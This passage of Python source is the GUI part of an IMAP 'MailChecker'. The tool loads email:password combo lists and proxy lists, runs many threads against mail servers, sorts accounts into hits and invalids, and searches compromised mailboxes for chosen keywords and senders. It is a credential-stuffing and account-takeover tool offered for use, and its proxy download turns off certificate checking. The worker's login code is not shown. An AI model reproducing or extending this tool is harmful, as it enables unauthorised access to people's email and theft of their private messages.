            domains_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'domains.txt')
            
            existing_domains = defaultdict(list)
            if os.path.exists(domains_file):
                with open(domains_file, 'r', encoding='utf-8') as f:
                    for line in f:
                        line = line.strip()
                        if line and '|' in line and not line.startswith('#'):
                            parts = line.split('|', 1)
                            if len(parts) == 2:
                                domain = parts[0].strip()
                                server = parts[1].strip()
                                existing_domains[domain].append(server)
            
            updated_count = 0
            for domain, working_server in working_servers.items():
                if domain in existing_domains:
                    if existing_domains[domain] != [working_server]:
                        existing_domains[domain] = [working_server]
                        updated_count += 1
                else:
                    existing_domains[domain] = [working_server]
                    updated_count += 1
            
            if updated_count > 0:
                with open(domains_file, 'w', encoding='utf-8') as f:
                    f.write("# IMAP Server Mappings - Auto-updated with working servers\n")
                    f.write("# Format: domain.com|imap.server.com\n\n")
                    
                    for domain in sorted(existing_domains.keys()):
                        for server in existing_domains[domain]:
                            f.write(f"{domain}|{server}\n")
                
                logging.info(f"Updated domains.txt: {updated_count} domains with working servers")
                self.update_status(f"Saved {updated_count} working servers to domains.txt", "#00bcd4")
                
        except Exception as e:
            logging.error(f"Failed to update domains.txt: {e}")

    def open_settings(self):
        dialog = SettingsDialog(self.settings, self)
        dialog.exec()

    def load_combos(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "Open Combo List", "", "Text Files (*.txt);;All Files (*)")
        if file_path:
            try:
                self.combos_loaded = 0
                try:
                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                        for _ in f:
                            self.combos_loaded += 1
                except UnicodeDecodeError:
                    with open(file_path, 'rb') as f:
                        for _ in f:
                            self.combos_loaded += 1
                
                self.combos_file_path = file_path
                self.combos_info.setText(f"Combos: {self.combos_loaded:,}")
                self.progress_bar.setMaximum(self.combos_loaded)
                self.update_status(f"Loaded {self.combos_loaded:,} combos", "#a3a3a3")
            except Exception as e:
                QMessageBox.critical(self, "Error", f"Failed to load combo file: {e}")

    def load_proxies(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "Open Proxy List", "", "Text Files (*.txt);;All Files (*)")
        if file_path:
            try:
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    self.proxies = [line.strip() for line in f if line.strip()]
                self.proxies_loaded = len(self.proxies)
                self.proxies_info.setText(f"Proxies: {self.proxies_loaded:,}")
                self.update_status(f"Loaded {self.proxies_loaded:,} proxies", "#a3a3a3")
            except Exception as e:
                QMessageBox.critical(self, "Error", f"Failed to load proxy file: {e}")

    def load_proxies_from_url(self):
        url = self.settings.value("proxy_reload_url", "")
        
        if not url:
            QMessageBox.warning(self, "Error", "Please set Proxy URL in Settings first!")
            return
        
        try:
            import urllib.request
            
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            
            self.update_status("Loading proxies from URL...", "#00bcd4")
            QApplication.processEvents()
            
            with urllib.request.urlopen(url, context=ctx, timeout=15) as response:
                content = response.read().decode('utf-8')
                
                new_proxies = [line.strip() for line in content.split('\n') if line.strip() and ':' in line]
                
                if new_proxies:
                    self.proxies = new_proxies
                    self.proxies_loaded = len(new_proxies)
                    self.proxies_info.setText(f"Proxies: {self.proxies_loaded:,}")
                    self.update_status(f"Loaded {self.proxies_loaded:,} proxies from URL", "#4ade80")
                    
                    QMessageBox.information(self, "Success", f"Loaded {self.proxies_loaded:,} proxies from:\n{url[:60]}...")
                else:
                    QMessageBox.warning(self, "Error", "No valid proxies found in URL!")
                    self.update_status("Failed to load proxies", "#f44336")
                    
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to load proxies from URL:\n{str(e)}")
            self.update_status("Failed to load proxies", "#f44336")

    def load_custom_domains(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "Open Custom Domains", "", "Text Files (*.txt);;All Files (*)")
        if file_path:
            try:
                count = 0
                temp_domain_servers = defaultdict(list)
                
                with open(file_path, 'r', encoding='utf-8') as f:
                    for line in f:
                        line = line.strip()
                        if line and '|' in line and not line.startswith('#'):
                            parts = line.split('|', 1)
                            if len(parts) == 2:
                                domain = parts[0].strip()
                                server = parts[1].strip()
                                temp_domain_servers[domain].append(server)
                                count += 1
                
                for domain, servers in temp_domain_servers.items():
                    self.domain_servers[domain].extend(servers)
                    self.custom_domains[domain] = {
                        'server': servers[-1],
                        'port': 993,
                        'source': 'Custom'
                    }
                
                self._update_final_domains()
                self.update_status(f"Loaded {count} custom domain entries", "lime")
                
                multi_server_domains = [d for d, s in temp_domain_servers.items() if len(s) > 1]
                if multi_server_domains:
                    QMessageBox.information(self, "Custom Domains", 
                        f"Loaded {count} custom domain entries\n\n" +
                        f"Domains with multiple servers: {len(multi_server_domains)}")
                else:
                    QMessageBox.information(self, "Custom Domains", f"Loaded {count} custom domain mappings")
            except Exception as e:
                QMessageBox.critical(self, "Error", f"Failed: {e}")

    def view_domain_mappings(self):
        dialog = DomainViewerDialog(self.final_domains, self)
        dialog.exec()

    def reload_blacklist(self):
        try:
            blacklist_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'blacklist.txt')
            self.blacklist = load_blacklist_from_file(blacklist_file)
            self.blacklist_loaded = len(self.blacklist)
            self.blacklist_info.setText(f"Blacklist: {self.blacklist_loaded:,}")
            self.update_status(f"Reloaded {self.blacklist_loaded:,} blacklisted domains", "#ff6b6b")
            
            QMessageBox.information(self, "Blacklist Reloaded", 
                                  f"Successfully reloaded {self.blacklist_loaded:,} blacklisted domains from blacklist.txt")
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to reload blacklist: {e}")

    def view_blacklist(self):
        dialog = QDialog(self)
        dialog.setWindowTitle("Blacklist")
        dialog.setMinimumSize(700, 550)
        dialog.setStyleSheet("""
            QDialog {
                background: qlineargradient(x1:0, y1:0, x2:1, y2:1,
                    stop:0 #0f0f0f, stop:1 #1a1a1a);
            }
            QLabel {
                color: #d4d4d4;
                font-size: 11pt;
            }
            QListWidget {
                background: rgba(26, 26, 26, 0.3);
                color: #ff6b6b;
                border: 2px solid rgba(115, 115, 115, 0.3);
                border-radius: 8px;
                font-size: 10pt;
                font-family: 'Courier New';
            }
            QListWidget::item {
                padding: 8px;
            }
            QPushButton {
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                    stop:0 #525252, stop:1 #737373);
                color: white;
                border: none;
                border-radius: 8px;
                padding: 10px 25px;
                font-weight: bold;
                font-size: 10pt;
            }
            QPushButton:hover {
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                    stop:0 #737373, stop:1 #a3a3a3);
            }
        """)
        
        layout = QVBoxLayout(dialog)
        layout.setSpacing(15)
        layout.setContentsMargins(20, 20, 20, 20)
        
        title = QLabel("Blacklisted Domains")
        title.setFont(QFont("Segoe UI", 16, QFont.Weight.Bold))
        title.setStyleSheet("color: #d4d4d4;")
        layout.addWidget(title)
        
        info_label = QLabel(f"Total Blacklisted Domains: {len(self.blacklist)}")
        info_label.setFont(QFont("Segoe UI", 11))
        info_label.setStyleSheet("color: #ff6b6b; padding: 5px;")
        layout.addWidget(info_label)
        
        list_widget = QListWidget()
        
        if self.blacklist:
            for domain in sorted(self.blacklist):
                list_widget.addItem(domain)
        else:
            empty_item = QListWidgetItem("No blacklisted domains")
            empty_item.setForeground(QColor("#888"))
            list_widget.addItem(empty_item)
        
        layout.addWidget(list_widget)
        
        button_layout = QHBoxLayout()
        button_layout.addStretch()
        
        close_btn = QPushButton("Close")
        close_btn.setFixedWidth(120)
        close_btn.clicked.connect(dialog.accept)
        button_layout.addWidget(close_btn)
        
        layout.addLayout(button_layout)
        
        dialog.exec()

    def edit_blacklist(self):
        import subprocess
        import platform
        
        blacklist_file = 'blacklist.txt'
        
        try:
            if platform.system() == 'Windows':
                os.startfile(blacklist_file)
            elif platform.system() == 'Darwin':
                subprocess.call(['open', blacklist_file])
            else:
                subprocess.call(['xdg-open', blacklist_file])
                
            QMessageBox.information(self, "Blacklist", 
                                  "After editing, click 'Reload Blacklist' button to apply changes.")
        except Exception as e:
            QMessageBox.warning(self, "Error", f"Could not open file: {e}\n\nPlease edit blacklist.txt manually.")

    def open_results_folder(self):
        if not self.current_session_folder or not os.path.exists(self.current_session_folder):
            if os.path.exists("Results"):
                folder_to_open = "Results"
            else:
                QMessageBox.warning(self, "Error", "No results folder found!\n\nStart a checking session first.")
                return
        else:
            folder_to_open = self.current_session_folder
        
        import subprocess
        import platform
        
        try:
            if platform.system() == 'Windows':
                os.startfile(folder_to_open)
            elif platform.system() == 'Darwin':
                subprocess.call(['open', folder_to_open])
            else:
                subprocess.call(['xdg-open', folder_to_open])
        except Exception as e:
            QMessageBox.warning(self, "Error", f"Could not open folder: {e}")

    def get_current_settings(self):
        self._update_final_domains()
        
        settings_dict = {
            "threads": self.settings.value("threads", 200, type=int),
            "timeout": self.settings.value("timeout", 12, type=int),
            "delimiter": self.settings.value("delimiter", ":"),
            "use_proxies": self.settings.value("use_proxies", False, type=bool),
            "proxy_type": self.settings.value("proxy_type", "HTTP/HTTPS"),
            "proxy_username": self.settings.value("proxy_username", ""),
            "proxy_password": self.settings.value("proxy_password", ""),
            
            "auto_reload_proxies": self.settings.value("auto_reload_proxies", False, type=bool),
            "proxy_reload_url": self.settings.value("proxy_reload_url", ""),
            
            "intelligence_search_enabled": self.settings.value("intelligence_search_enabled", False, type=bool),
            "intelligence_keywords": self.settings.value("intelligence_keywords", ""),
            "intelligence_senders": self.settings.value("intelligence_senders", ""),
            "search_in_subject": self.settings.value("search_in_subject", True, type=bool),
            "search_in_body": self.settings.value("search_in_body", True, type=bool),
            "intelligence_mailboxes": self.settings.value("intelligence_mailboxes", "INBOX"),
            "intelligence_emails_to_fetch": self.settings.value("intelligence_emails_to_fetch", 5, type=int),
            "domain_mappings": self.final_domains
        }
        
        settings_dict['domain_servers'] = dict(self.domain_servers)
        
        return settings_dict

    def start_checking(self):
        if not hasattr(self, 'combos_file_path') or not self.combos_file_path:
            QMessageBox.warning(self, "Warning", "Please load a combo list first.")
            return

        self.is_running = True
        self.is_paused = False
        self.reset_ui()

        self.worker = CheckerWorker(self.get_current_settings())
        
        self.worker.domain_servers = dict(self.domain_servers)
        
        self.current_session_folder = self.worker.session_folder
        
        self.worker.combo_file_path = self.combos_file_path
        self.worker.blacklist = self.blacklist.copy()
        
        if hasattr(self, 'proxies'):
            self.worker.proxies = self.proxies

        self.worker_thread = QThread()
        self.worker.moveToThread(self.worker_thread)

        self.worker.signals.progress.connect(self.set_last_gui_stats)
        self.worker.signals.log.connect(self.add_log_message)
        self.worker.signals.finished.connect(self.on_checking_finished)
        self.worker.signals.cpm.connect(self.update_cpm)
        self.worker.signals.add_hit.connect(self.add_hit_to_table)
        self.worker.signals.add_invalid.connect(self.add_invalid_to_table)
        self.worker.signals.add_error.connect(self.add_error_to_table)
        self.worker.signals.add_intelligence_hit.connect(self.add_intelligence_hit_to_table)
        self.worker.signals.blacklisted.connect(self.update_blacklisted_count)
        
        self.worker.signals.save_working_servers.connect(self.update_domains_file)

        self.worker_thread.started.connect(self.worker.run)
        self.worker_thread.start()

        self.toggle_controls(True)
        
        session_name = os.path.basename(self.current_session_folder)
        self.update_status(f"Running... {session_name}", "#4ade80")
        
    def add_hit_to_table(self, combo, details):
        self._hit_batch.append((combo, details))
        
        if len(self._hit_batch) >= 2 or self.results_table_hits.rowCount() == 0:
            self.results_table_hits.setUpdatesEnabled(False)
            
            for combo_str, detail_str in self._hit_batch:
                if self.results_table_hits.rowCount() >= self.max_table_rows:
                    self.results_table_hits.removeRow(0)
                
                row = self.results_table_hits.rowCount()
                self.results_table_hits.insertRow(row)
                
                item1 = QTableWidgetItem(combo_str)
                item2 = QTableWidgetItem(detail_str)
                item1.setForeground(QBrush(QColor("#4ade80")))
                item2.setForeground(QBrush(QColor("#4ade80")))
                
                self.results_table_hits.setItem(row, 0, item1)
                self.results_table_hits.setItem(row, 1, item2)
            
            self.results_table_hits.setUpdatesEnabled(True)
            self._hit_batch.clear()

    def add_invalid_to_table(self, combo, reason):
        self._invalid_batch.append((combo, reason))
        
        if len(self._invalid_batch) >= 5:
            self.results_table_invalids.setUpdatesEnabled(False)
            
            for combo_str, reason_str in self._invalid_batch:
                if self.results_table_invalids.rowCount() >= self.max_table_rows:
                    self.results_table_invalids.removeRow(0)
                
                row = self.results_table_invalids.rowCount()
                self.results_table_invalids.insertRow(row)
                self.results_table_invalids.setItem(row, 0, QTableWidgetItem(combo_str))
                self.results_table_invalids.setItem(row, 1, QTableWidgetItem(reason_str))
            
            self.results_table_invalids.setUpdatesEnabled(True)
            self._invalid_batch.clear()

    def add_error_to_table(self, combo, error):
        self._error_batch.append((combo, error))
        
        if len(self._error_batch) >= 10:
            self.results_table_errors.setUpdatesEnabled(False)
            
            for combo_str, error_str in self._error_batch:
                if self.results_table_errors.rowCount() >= self.max_table_rows:
                    self.results_table_errors.removeRow(0)
                
                row = self.results_table_errors.rowCount()
                self.results_table_errors.insertRow(row)
                self.results_table_errors.setItem(row, 0, QTableWidgetItem(combo_str))
                self.results_table_errors.setItem(row, 1, QTableWidgetItem(error_str))
            
            self.results_table_errors.setUpdatesEnabled(True)
            self._error_batch.clear()

    def add_intelligence_hit_to_table(self, email_addr, match_type, match_detail, mailbox, details_list):
        if self.results_table_intelligence_hits.rowCount() >= self.max_table_rows:
            self.results_table_intelligence_hits.removeRow(0)
        
        row = self.results_table_intelligence_hits.rowCount()
        self.results_table_intelligence_hits.insertRow(row)
        
        items = [
            QTableWidgetItem(email_addr),
            QTableWidgetItem(match_type),
            QTableWidgetItem(match_detail),
            QTableWidgetItem(mailbox),
            QTableWidgetItem(f"{len(details_list)}")
        ]
        
        color = QColor("#9b59b6")
        for i, item in enumerate(items):
            item.setForeground(QBrush(color))
            self.results_table_intelligence_hits.setItem(row, i, item)
        
        items[0].setData(Qt.ItemDataRole.UserRole, (details_list, match_type, match_detail))

    def show_intelligence_report(self, row, column):
        item = self.results_table_intelligence_hits.item(row, 0)
        if item:
            data = item.data(Qt.ItemDataRole.UserRole)
            if data:
                details_list, match_type, match_detail = data
                dialog = IntelligenceReportDialog(details_list, match_type, match_detail, self)
                dialog.exec()

    def update_blacklisted_count(self, count):
        self.stat_widgets['blacklisted'].value_label.setText(f"{count:,}")

    def pause_checking(self):
        if not self.is_running: 
            return
        self.is_paused = not self.is_paused
        self.worker.toggle_pause()
        self.btn_pause.setText("RESUME" if self.is_paused else "PAUSE")
        self.update_status("Paused" if self.is_paused else "Running...", "#a3a3a3")

    def stop_checking(self):
        if not self.is_running: 
            return
        
        if self._hit_batch:
            self.results_table_hits.setUpdatesEnabled(False)
            for combo, details in self._hit_batch:
                if self.results_table_hits.rowCount() >= self.max_table_rows:
                    self.results_table_hits.removeRow(0)
                row = self.results_table_hits.rowCount()
                self.results_table_hits.insertRow(row)
                item1 = QTableWidgetItem(combo)
                item2 = QTableWidgetItem(details)
                item1.setForeground(QBrush(QColor("#4ade80")))
                item2.setForeground(QBrush(QColor("#4ade80")))
                self.results_table_hits.setItem(row, 0, item1)
                self.results_table_hits.setItem(row, 1, item2)
            self.results_table_hits.setUpdatesEnabled(True)
            self._hit_batch.clear()
        
        if self._invalid_batch:
            self.results_table_invalids.setUpdatesEnabled(False)
            for combo, reason in self._invalid_batch:
                if self.results_table_invalids.rowCount() >= self.max_table_rows:
                    self.results_table_invalids.removeRow(0)
                row = self.results_table_invalids.rowCount()
                self.results_table_invalids.insertRow(row)
                self.results_table_invalids.setItem(row, 0, QTableWidgetItem(combo))
                self.results_table_invalids.setItem(row, 1, QTableWidgetItem(reason))
            self.results_table_invalids.setUpdatesEnabled(True)
            self._invalid_batch.clear()
        
        if self._error_batch:
            self.results_table_errors.setUpdatesEnabled(False)
            for combo, error in self._error_batch:
                if self.results_table_errors.rowCount() >= self.max_table_rows:
                    self.results_table_errors.removeRow(0)
                row = self.results_table_errors.rowCount()
                self.results_table_errors.insertRow(row)
                self.results_table_errors.setItem(row, 0, QTableWidgetItem(combo))
                self.results_table_errors.setItem(row, 1, QTableWidgetItem(error))
            self.results_table_errors.setUpdatesEnabled(True)
            self._error_batch.clear()
        
        self.worker.stop()
        
        self.btn_stop.setEnabled(False)
        self.update_status("Stopping...", "#ff6b6b")
        
        QApplication.processEvents()
        
        if self.worker_thread and self.worker_thread.isRunning():
            self.worker_thread.quit()
            if not self.worker_thread.wait(3000):
                self.worker_thread.terminate()
                self.worker_thread.wait()
        
        self.is_running = False
        self.is_paused = False
        self.toggle_controls(False)
        self.update_status("Stopped", "#525252")

    def on_checking_finished(self, final_stats, elapsed_time, final_cpm):
        self.is_running = False
        self.is_paused = False
        self.toggle_controls(False)
        self.update_status("Finished", "#a3a3a3")
        if self.worker_thread:
            self.worker_thread.quit()
            self.worker_thread.wait()
        
        self.worker = None
        self.worker_thread = None
        
        gc.collect()
        
        elapsed_str = str(timedelta(seconds=int(elapsed_time)))
        
        msg = f"""Verification Complete

Checked: {final_stats['checked']:,}
Hits: {final_stats['hits']:,}
Invalids: {final_stats['invalids']:,}
Errors: {final_stats['errors']:,}
Intelligence: {final_stats['keyword_hits']:,}
Blacklisted: {final_stats['blacklisted']:,}

Time: {elapsed_str}
Average CPM: {final_cpm:,}

Results saved to:
{self.current_session_folder}"""
        
        QMessageBox.information(self, "Complete", msg)

    def update_status(self, message, color):
        self.status_label.setText(f"{message}")
        self.status_label.setStyleSheet(f"color: {color}; font-weight: bold;")

    def update_cpm(self, cpm_val):
        self.cpm = cpm_val
        self.stat_widgets['cpm'].value_label.setText(f"{cpm_val:,}")

    def toggle_controls(self, running):
        self.btn_start.setEnabled(not running)
        self.btn_pause.setEnabled(running)
        self.btn_stop.setEnabled(running)

    def reset_ui(self):
        tables = [self.results_table_hits, self.results_table_invalids, 
                  self.results_table_errors, self.results_table_intelligence_hits]
        for table in tables:
            table.setRowCount(0)
        self.log_box.clear()
        self.progress_bar.setValue(0)
        
        self.stat_widgets['checked'].value_label.setText("0")
        self.stat_widgets['hits'].value_label.setText("0")
        self.stat_widgets['invalids'].value_label.setText("0")
        self.stat_widgets['errors'].value_label.setText("0")
        self.stat_widgets['intelligence'].value_label.setText("0")
        self.stat_widgets['cpm'].value_label.setText("0")
        self.stat_widgets['blacklisted'].value_label.setText("0")
        
        self.tabs.setTabText(0, "HITS (0)")
        self.tabs.setTabText(1, "INVALIDS (0)")
        self.tabs.setTabText(2, "ERRORS (0)")
        self.tabs.setTabText(3, "INTELLIGENCE (0)")
        
        self._hit_batch = []
        self._invalid_batch = []
        self._error_batch = []

    def set_last_gui_stats(self, checked, hits, invalids, errors, intelligence):
        self.last_gui_stats = (checked, hits, invalids, errors, intelligence)
        self.tabs.setTabText(0, f"HITS ({hits:,})")
        self.tabs.setTabText(1, f"INVALIDS ({invalids:,})")
        self.tabs.setTabText(2, f"ERRORS ({errors:,})")
        self.tabs.setTabText(3, f"INTELLIGENCE ({intelligence:,})")

    def timer_update_progress(self):
        checked, hits, invalids, errors, intelligence = self.last_gui_stats
        if self.combos_loaded > 0:
            self.progress_bar.setValue(checked)
        
        self.stat_widgets['checked'].value_label.setText(f"{checked:,}")
        self.stat_widgets['hits'].value_label.setText(f"{hits:,}")
        self.stat_widgets['invalids'].value_label.setText(f"{invalids:,}")
        self.stat_widgets['errors'].value_label.setText(f"{errors:,}")
        self.stat_widgets['intelligence'].value_label.setText(f"{intelligence:,}")

    def add_log_message(self, message, color):
        self.log_box.moveCursor(QTextCursor.MoveOperation.End)
        self.log_box.setTextColor(color)
        self.log_box.insertPlainText(f"[{time.strftime('%H:%M:%S')}] {message}\n")
        self.log_box.moveCursor(QTextCursor.MoveOperation.End)

    def show_table_context_menu(self, table, position):
        menu = QMenu()
        menu.setStyleSheet("""
            QMenu {
                background: rgba(26, 26, 26, 0.95);
                color: #d4d4d4;
                border: 2px solid rgba(115, 115, 115, 0.3);
                border-radius: 8px;
            }
            QMenu::item {
                padding: 10px 25px;
                border-radius: 5px;
            }
            QMenu::item:selected {
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                    stop:0 #525252, stop:1 #737373);
            }
        """)
        copy_action = menu.addAction("Copy Selected")
        action = menu.exec(table.mapToGlobal(position))
        if action == copy_action:
            self.copy_table_selection(table)

    def copy_table_selection(self, table):
        selection = table.selectionModel().selectedRows()
        if not selection: 
            return

        clipboard_text = ""
        for index in sorted(selection):
            row_text = [table.item(index.row(), col).text() for col in range(table.columnCount())]
            clipboard_text += "\t".join(row_text) + "\n"

        QApplication.clipboard().setText(clipboard_text)

    def export_table(self, table):
        if table.rowCount() == 0:
            QMessageBox.information(self, "Export", "No data to export!")
            return
        
        file_path, _ = QFileDialog.getSaveFileName(self, "Save CSV", "", "CSV Files (*.csv)")
        if file_path:
            try:
                with open(file_path, 'w', encoding='utf-8') as f:
                    headers = [table.horizontalHeaderItem(i).text() for i in range(table.columnCount())]
                    f.write(','.join(headers) + '\n')
                    for row in range(table.rowCount()):
                        data = [table.item(row, col).text().replace(',', ';') for col in range(table.columnCount())]
                        f.write(','.join(data) + '\n')
                self.update_status("Exported successfully!", "lime")
                QMessageBox.information(self, "Export", f"Data exported to:\n{file_path}")
            except Exception as e:
                QMessageBox.critical(self, "Error", f"Export failed: {e}")

    def closeEvent(self, event):
        if self.is_running:
            reply = QMessageBox.question(self, "Exit", 
                                         "Checker is running. Exit anyway?",
                                         QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No,
                                         QMessageBox.StandardButton.No)
            if reply == QMessageBox.StandardButton.Yes:
                self.worker.stop()
                if self.worker_thread and self.worker_thread.isRunning():
                    self.worker_thread.quit()
                    if not self.worker_thread.wait(2000):
                        self.worker_thread.terminate()
                        self.worker_thread.wait()
                event.accept()
            else:
                event.ignore()
        else:
            event.accept()


def global_exception_hook(exctype, value, traceback):
    sys.__excepthook__(exctype, value, traceback)
    logging.critical("Unhandled exception:", exc_info=(exctype, value, traceback))


if __name__ == '__main__':
    sys.excepthook = global_exception_hook
    app = QApplication(sys.argv)
    app.setApplicationName("MailChecker")
    app.setOrganizationName("MailChecker")
    app.setStyle("Fusion")
    
    main_win = MainWindow()
    main_win.show()
    sys.exit(app.exec())